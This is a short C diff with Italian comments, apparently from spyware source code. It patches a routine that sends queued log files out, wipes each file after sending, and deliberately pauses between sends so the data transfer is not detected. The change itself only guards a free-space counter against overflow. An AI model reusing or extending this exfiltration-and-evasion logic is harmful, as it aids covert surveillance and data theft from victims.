@@ -1093,6 +1093,7 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 	char search_mask[64];
 	log_list_struct *log_list;
 	HANDLE hFind = INVALID_HANDLE_VALUE;
+	DWORD tmp_free_space;
 
 	// Cerca tutti i file di tipo "1/0LOG*.log", sia LOG_, sia LOGF_
 	// Sono i nuovi tipi di log
@@ -1139,7 +1140,11 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 
 		// Cancella il log appena inviato
 		HM_WipeFileA(log_file_path); 
-		log_free_space += log_list->size;
+
+		// Restituisce lo spazio disco (evitando overflow dovuti a race)
+		tmp_free_space = log_free_space + log_list->size;
+		if (tmp_free_space > log_free_space) // la somma deve solo che farlo aumentare
+			log_free_space = tmp_free_space;
 
 		// Fa una pausa per evitare che sia rilevabile una trasmissione
 		// di dati continua
